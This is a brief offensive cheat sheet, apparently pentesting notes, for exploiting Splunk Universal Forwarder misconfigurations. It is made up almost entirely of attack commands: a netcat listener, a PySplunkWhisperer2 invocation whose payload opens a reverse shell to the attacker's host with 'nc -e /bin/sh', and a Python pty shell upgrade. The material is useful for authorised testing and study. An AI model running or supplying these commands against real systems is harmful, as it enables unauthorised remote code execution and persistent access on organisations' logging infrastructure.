# Splunk

### Run listner

```text
nc -nlvp 4444
```

### Local privilege escalation, or remote code execution, through Splunk Universal Forwarder \(UF\) misconfigurations.

```text
python PySplunkWhisperer2_remote.py --host <remote_host> --lhost <local_host> --username <*******> --password <***********> --payload 'nc.traditional -e/bin/sh '<local_host>' '<localport>''
```

### Spawn a process, and connect its controlling terminal with the current process’s standard io.

`python3 -c 'import pty;pty.spawn("/bin/bash")'`



Ref: [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

